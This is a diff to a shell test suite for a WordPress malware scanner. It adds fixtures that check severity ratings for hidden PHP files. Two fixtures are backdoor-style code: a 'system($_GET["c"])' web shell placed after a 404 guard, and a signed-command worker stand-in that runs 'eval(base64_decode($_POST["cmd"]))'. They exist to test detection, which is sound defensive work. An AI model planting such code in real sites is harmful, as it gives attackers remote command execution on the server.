@@ -229,6 +229,27 @@ hasnt "$R" "$(msg 'zz-unknown')" "ignored finding stays ignored when only its da
 $WP php2shell ignore "$ID" --undo >/dev/null
 rm -f "$C/mu-plugins/kinsta-mu-plugins.php" "$C/mu-plugins/zz-unknown.php" "$C/zz-dropped.php" "$SITE/.cache.php" "$SITE/.user.ini" "$C/uploads/guarded.php"
 
+# Files that can't run anything (a 404/exit guard, then data) and the Installatron Worker.
+printf '<?php header("HTTP/1.0 404 Not Found");exit;?>\npid=IyF59d4lSU7ozZGcYzNy64xNxu5ACWXyjik+b7h6tE4=\n' > "$SITE/.htabcdefg.appconfig.php"
+printf '<?php header("HTTP/1.0 404 Not Found");exit;?>\npid=x\n<?php system($_GET["c"]);\n' > "$SITE/.htzzzzzzz.appconfig.php"
+KEYBODY='MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCsoqNfmgfzBGEKQzAkoswIehQEk8CV9JCJbkojjwl5FlSyC8C6YBNY+eWcLnTiONb5iIh5d9a/HI8z66n4C5wI9VUe1+Lim3FaorVb9Ay/B5qQencO2Uf/FW8re/crgooAy6coJp1vW+bcsh44AqIOI1UMYIfh34PKxorNkioE7QIDAQAB'
+{
+	printf '<?php\n/*\nPlugin Name: Installatron Worker\nAuthor: Installatron\n*/\n/* Test stand-in, not Installatron code. Installatron LLC */\n'
+	printf 'if ( !isset($_POST["request_method"]) ) { return; }\n'
+	printf 'function __i_verify_signature($message, $signature){ $rsa = new Crypt_RSA(); $rsa->loadKey(%s-----BEGIN PUBLIC KEY-----\r%s-----END PUBLIC KEY-----%s); return $rsa->verify($message, $signature);}\n' "'" "$KEYBODY" "'"
+	printf 'if ( !__i_verify_signature($_POST["request_payload"], pack("H*", $_POST["signature"])) ) { $GLOBALS["e"][] = "I_ACCESS_DENIED"; exit; }\n'
+	printf 'eval(base64_decode($_POST["cmd"]));\n'
+} > "$SITE/it-api.php"
+R=$(scan)
+has "$R" "$(sev low 'Hidden data file in the site root: .htabcdefg.appconfig.php')" "a hidden file that can only answer 404 is low (a plugin's data file)"
+has "$R" "$(sev high 'Hidden PHP file in the site root: .htzzzzzzz.appconfig.php')" "...but not if real PHP follows the guard"
+has "$R" "$(sev info 'Installatron Worker: it-api.php')" "the Installatron Worker (signed commands only) is information, not an alarm"
+hasnt "$R" '[.findings[] | select((.message|test("it-api.php")) and .severity != "info")] | length > 0' "no other alarms for the Installatron Worker"
+sed -i "s|${KEYBODY:0:40}|${KEYBODY:0:36}AAAA|" "$SITE/it-api.php"
+R=$(scan)
+has "$R" "$(sev medium 'web-request input, decoding and eval: it-api.php')" "a worker look-alike with another key is still flagged"
+rm -f "$SITE/.htabcdefg.appconfig.php" "$SITE/.htzzzzzzz.appconfig.php" "$SITE/it-api.php"
+
 section "8. Users & roles"
 $WP user create olduser old@test.local --role=subscriber --quiet >/dev/null 2>&1
 $WP eval 'global $wpdb; $wpdb->update($wpdb->users, array("user_registered"=>"2020-01-01 00:00:00"), array("user_login"=>"olduser"));'
